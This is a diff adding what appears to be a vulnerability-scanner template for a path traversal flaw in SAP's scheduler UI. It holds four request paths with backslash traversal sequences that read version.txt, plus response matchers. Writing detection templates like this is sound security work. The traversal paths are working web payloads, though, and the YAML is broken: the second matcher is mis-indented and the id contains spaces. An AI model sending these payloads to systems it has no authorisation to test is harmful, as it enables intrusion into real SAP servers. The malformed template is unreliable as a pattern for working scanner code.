@@ -1,0 +1,25 @@
+id: SAP Path Traversal
+
+info:
+  name: SAP Path Traversal
+  author: Clark
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/scheduler/ui/js/?\&..\\\&..\\\&..\\\version.txt'
+      - '{{BaseURL}}/scheduler/ui/js/UIUtilJavaScriptJS?\&..\\\&..\\\&..\\\version.txt'
+      - '{{BaseURL}}/scheduler/ui/js/4c540510/UIUtilJavaScriptJS?\&..\\\&..\\\&..\\\version.txt'
+      - '{{BaseURL}}/scheduler/ui/js/ffffffffbac53543/UIUtilJavaScriptJS?\&..\\\&..\\\&..\\\version.txt'
+
+    matchers:
+      - type: word
+        words:
+          - "Build"
+        part: body
+        
+         - type: word
+        words:
+          - 'text/plain'
+        part: header
